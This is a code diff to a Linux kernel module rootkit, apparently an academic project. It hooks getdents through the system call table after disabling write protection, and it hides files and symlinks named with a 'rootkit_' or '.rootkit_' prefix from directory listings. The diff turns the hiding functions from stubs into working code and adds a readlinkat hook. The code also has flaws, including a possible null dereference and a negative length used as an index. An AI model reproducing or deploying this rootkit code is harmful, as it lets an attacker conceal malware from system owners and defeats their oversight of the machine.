@@ -20,7 +20,7 @@
 #include <linux/proc_fs.h>
 #include <linux/delay.h>
 #include <linux/string.h>
-
+#include <linux/errno.h>
 #include "sysmap.h"
 
 
@@ -31,6 +31,7 @@ MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");
 void **sys_call_table;
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage ssize_t (*syscall_readlink) (const char *path, char *buf, size_t bufsiz);
+asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf, size_t bufsiz);
 
 /*
  * counter to ensure every process has left our manipulated syscall before
@@ -51,7 +52,11 @@ int hide(char *d_name)
 {
 	if(strstr(d_name, "rootkit_") == d_name) 
 	{
-		return 0;
+		return 1;
+	}
+	else if(strstr(d_name, ".rootkit_") == d_name)
+	{
+		return 1;
 	}
 
 	return 0;
@@ -61,10 +66,15 @@ int hide(char *d_name)
  * Checks whether a linux_dirent is a symbolic link and if it is
  * checks whether we need to hide it, too.
  */
-int check_symlink(struct linux_dirent __user *dirp)
+int check_symlink(char *path)
 {
+	char *ptr, *name;
+	char delimiter = '/';
 	
-	return 0;
+	ptr = strrchr(path, delimiter);
+	name = ptr;
+
+	return hide(name);
 }
 
 ssize_t get_path(unsigned int fd, char *path, size_t bufsiz) {
@@ -102,13 +112,14 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 {
 	call_counter++;
 	/* nothing else above this line */
-
+	
+	mm_segment_t old_fs;
 	char buf[128];
 	char lpath[128];
 	char path[128];
 	size_t path_len;
 	size_t buf_len;
-	size_t lpath_len;
+	ssize_t lpath_len;
 	long ret;
 	int len = 0;
 	int tlen = 0;
@@ -131,17 +142,27 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 		memcpy(buf+path_len, dirp->d_name, strlen(dirp->d_name));
 		memset(buf+path_len+strlen(dirp->d_name)+1, '\0', 1);
 		printk(KERN_INFO "Currently parsing file %s\n", buf);
-		lpath_len = (*syscall_readlink) (buf, lpath, 128);
-		if(lpath_len > 0)
-			printk(KERN_INFO "Found symlink to: %s\n", lpath);
 		
-		/* Check if we need to hide this file */
-		if(hide(dirp->d_name))
-		{	
+
+		old_fs = get_fs();
+		set_fs(KERNEL_DS);
+		
+		lpath_len = (*syscall_readlinkat) (fd, dirp->d_name, lpath, 128);
+			
+		set_fs(old_fs);
+		
+		memset(lpath+lpath_len, '\0', 1);	
+		printk(KERN_INFO "Found symlink to: %s - Length of the path: %d\n", lpath, lpath_len);
+		
+
+		/* Check if we need to hide this symlink */
+		if(check_symlink(lpath))
+		{
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
-		}
-		else if(check_symlink(dirp)) /* we need to hide this symlink */
+		}	
+		/* Check if we need to hide this file */
+		else if(hide(dirp->d_name))
 		{	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
@@ -200,6 +221,7 @@ int init_module (void)
 	sys_call_table = (void *) sysmap_sys_call_table;
 
 	syscall_readlink = (void*) sys_call_table[__NR_readlink];
+	syscall_readlinkat = (void*) sys_call_table[__NR_readlinkat];
 
 	/* disable the write protection */
 	disable_page_protection();
